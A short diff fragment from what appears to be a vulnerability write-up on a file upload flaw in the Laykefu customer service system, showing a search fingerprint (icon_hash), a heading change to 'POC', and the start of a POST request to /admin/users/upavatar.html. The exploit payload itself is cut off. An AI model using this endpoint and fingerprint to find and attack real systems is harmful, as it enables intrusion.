@@ -7,7 +7,7 @@ Laykefu客服系统/admin/users/upavatar.html接口处存在文件上传漏洞�
 icon_hash="-334624619"
 ```
 
-## poc
+## POC
 ```
 POST /admin/users/upavatar.html HTTP/1.1
 Host: xxx.xxx.xxx
